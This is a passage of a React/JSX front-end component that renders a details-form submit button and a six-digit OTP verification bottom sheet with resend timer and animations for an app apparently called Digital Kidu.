                    className="w-full h-[54px] rounded-2xl bg-[#00c8dc] hover:bg-[#00b4c6] active:scale-[0.99] text-white font-bold text-[17px] flex items-center justify-center gap-2 transition-all cursor-pointer shadow-lg shadow-[#00c8dc]/25 disabled:opacity-80"
                  >
                    {isDetailsSubmitting ? (
                      <svg
                        className="animate-spin h-5 w-5 text-white"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        />
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        />
                      </svg>
                    ) : (
                      <>
                        <span className="text-white font-bold">Continue</span>
                        <svg
                          width="18"
                          height="18"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          strokeWidth="2.6"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          className="text-white"
                        >
                          <path d="M9 18l6-6-6-6" />
                        </svg>
                      </>
                    )}
                  </button>
                </div>
              </form>
            </div>

            {/* Footer Security Badge */}
            <div className="shrink-0 pt-3 text-center flex items-center justify-center gap-1.5 text-[11px] uppercase tracking-wider text-[#475569]">
              <svg
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
              </svg>
              <span>256-BIT SSL ENCRYPTED</span>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* 4. OTP VERIFICATION BOTTOM SHEET OVER HERO SPLASH (MATCHING IMAGE 3)      */}
      {/* ========================================================================= */}
      {currentScreen === "otp" && (
        <div className="w-full h-[100dvh] max-h-[100dvh] relative overflow-hidden flex flex-col justify-end">
          {/* Background hero image with mask dancer (Full Width) */}
          <img
            src="/tets.png"
            alt="Digital Kidu Splash"
            className="absolute inset-0 w-full h-full object-cover object-center pointer-events-none"
          />

          {/* Dimmed backdrop overlay */}
          <div className="absolute inset-0 w-full h-full bg-black/35 backdrop-blur-[1px]" />

          {/* Bottom Sheet Modal Card (Pixel-perfect match to Image 3) */}
          <div className="relative w-full max-w-[480px] mx-auto bg-white rounded-t-[32px] sm:rounded-t-[36px] shadow-2xl z-20 px-6 pt-4 pb-16 min-h-[75dvh] sm:min-h-[70dvh] max-h-[92dvh] overflow-y-auto animate-slide-up flex flex-col shrink-0">
            {/* Top drag handle indicator */}
            <div className="w-12 h-1 bg-[#E2E8F0] rounded-full mx-auto mb-6 shrink-0" />

            {/* Icon + Title Header Row */}
            <div className="flex items-center gap-3.5 mb-5">
              {/* Phone badge */}
              <div className="w-11 h-11 rounded-full bg-[#E0F4F8] flex items-center justify-center shrink-0">
                <svg
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#00c8dc"
                  strokeWidth="2.2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
                  <line x1="12" y1="18" x2="12.01" y2="18" />
                </svg>
              </div>

              <div>
                <h3 className="text-[17.5px] sm:text-[18.5px] font-bold text-[#0F172A] leading-tight">
                  OTP Verification
                </h3>
                <p className="text-[12.5px] sm:text-[13px] text-[#64748B] font-normal leading-snug">
                  Check your email or mobile number, 6-digit code
                </p>
              </div>
            </div>

            {/* 6 OTP Boxes with Dash — and Shake on error */}
            <div
              className={`relative flex items-center justify-between gap-2 sm:gap-2.5 mb-4 select-none transition-transform ${isOtpShaking ? "translate-x-[-8px] transition-none" : ""
                }`}
              style={
                isOtpShaking
                  ? {
                    animation: "shake 0.45s cubic-bezier(.36,.07,.19,.97) both",
                  }
                  : undefined
              }
            >
              {[0, 1, 2, 3, 4, 5].map((index) => {
                const hasValue = index < otp.length
                const isCurrent = index === otp.length
                const digit = otp[index]

                return (
                  <div
                    key={index}
                    className={`flex-1 h-[52px] sm:h-[56px] rounded-[16px] bg-[#F8FAFC] border flex items-center justify-center transition-all ${otpError
                      ? "border-red-400 bg-red-50/20 text-red-600"
                      : isCurrent
                        ? "border-[1.5px] border-[#00c8dc] bg-white ring-2 ring-[#00c8dc]/20 shadow-sm"
                        : hasValue
                          ? "border-[#00c8dc] bg-white text-[#0F172A]"
                          : "border-[#E2E8F0]"
                      }`}
                  >
                    {hasValue ? (
                      <span className="text-[19px] sm:text-[22px] font-bold text-[#0F172A]">
                        {digit}
                      </span>
                    ) : isCurrent ? (
                      <span className="w-[1.5px] h-[20px] bg-[#00c8dc] animate-pulse" />
                    ) : (
                      <span className="text-[#CBD5E1] text-[17px] sm:text-[18px] font-light leading-none select-none">
                        —
                      </span>
                    )}
                  </div>
                )
              })}

              <input
                ref={otpInputRef}
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={6}
                value={otp}
                autoComplete="one-time-code"
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, "").slice(0, 6)
                  setOtp(val)
                  setOtpError("")
                  if (val.length === 6) {
                    setTimeout(() => handleOtpSubmit(val), 200)
                  }
                }}
                className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                autoFocus
              />
            </div>

            {/* Error Message */}
            {otpError && (
              <p className="text-red-500 text-[12.5px] font-medium mb-2.5 text-center">
                {otpError}
              </p>
            )}

            {/* Verify OTP Button */}
            <button
              type="button"
              disabled={otp.length !== 6 || isOtpSubmitting}
              onClick={() => handleOtpSubmit()}
              className={`w-full h-[52px] sm:h-[54px] rounded-full text-white font-semibold text-[17px] tracking-wide flex items-center justify-center transition-all shadow-sm ${otp.length === 6 && !isOtpSubmitting
                ? "bg-[#00c8dc] hover:bg-[#00b4c6] active:scale-[0.99] cursor-pointer"
                : "bg-[#00c8dc] opacity-90 cursor-pointer"
                }`}
            >
              {isOtpSubmitting ? (
                <svg
                  className="animate-spin h-5 w-5 text-white"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    className="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    strokeWidth="4"
                  />
                  <path
                    className="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                  />
                </svg>
              ) : (
                "Verify OTP"
              )}
            </button>

            {/* Resend code timer */}
            <div className="mt-3 sm:mt-4 text-center text-[13px] sm:text-[13.5px]">
              {timer > 0 ? (
                <span className="text-[#64748B]">
                  Resend code in <span className="font-semibold text-[#0F172A]">{formatTimer(timer)}</span>
                </span>
              ) : (
                <button
                  type="button"
                  onClick={handleResendOtp}
                  className="text-[#00c8dc] font-semibold hover:underline cursor-pointer bg-transparent border-none"
                >
                  Resend OTP
                </button>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Inline Keyframe Animations */}
      <style jsx global>{`
        @keyframes slideDownFromTop {
          0% {
            transform: translateY(-100%);
            opacity: 0;
          }
          100% {
            transform: translateY(0);
            opacity: 1;
          }
        }

        @keyframes slideUpFromBottom {
          0% {
            transform: translateY(100%);
            opacity: 0;
          }
          100% {
            transform: translateY(0);
            opacity: 1;
          }
        }

        .animate-slide-down {
          animation: slideDownFromTop 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }

        .animate-slide-up {
          animation: slideUpFromBottom 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }

        @keyframes shake {
          10%, 90% { transform: translate3d(-1px, 0, 0); }
          20%, 80% { transform: translate3d(2px, 0, 0); }
          30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
          40%, 60% { transform: translate3d(4px, 0, 0); }
        }
      `}</style>
    </div>
  )
}
